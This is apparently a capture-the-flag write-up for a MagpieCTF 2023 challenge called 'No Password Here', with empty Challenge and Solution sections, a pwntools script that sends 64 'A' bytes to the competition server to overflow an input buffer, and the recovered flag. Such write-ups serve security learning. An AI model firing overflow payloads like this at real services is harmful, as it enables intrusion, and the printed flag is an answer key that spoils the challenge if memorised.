# No Password Here

## Challenge

## Solution

## Exploit

```py
#!/usr/bin/env python3
from pwn import *

host = args.HOST or 'srv1.2023.magpiectf.ca'
port = int(args.PORT or 1996)

io = connect(host, port)

io.sendline(b'A' * 0x40)

io.interactive()
```

## Flag

```
magpie{5c4nf_n07_54f3}
```
